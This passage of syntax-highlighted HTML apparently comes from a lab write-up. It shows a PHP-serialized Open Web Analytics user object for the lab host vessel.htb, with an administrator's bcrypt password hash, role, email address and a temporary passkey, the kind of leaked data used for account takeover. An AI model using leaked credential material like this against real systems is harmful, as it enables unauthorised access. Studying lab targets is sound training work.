font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:8:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"password"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:60:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$2</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">y</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$m0L7pmXbKNxvRVqJHGWJY</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">.4kvq3HlhHcbVhjAqDkzoZcVu/sw4PCW"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VARCHAR(255)"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VARCHAR(255)"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"real_name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default admin"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VARCHAR(255)"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email_address"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:16:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin@vessel.htb"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VARCHAR(255)"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"temp_passkey"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:32:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"cc25c639f4395109e0381784b7ec840e"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VARCHAR(255)"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"creation_date"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:10:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1650211659"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:6:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"BIGINT"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
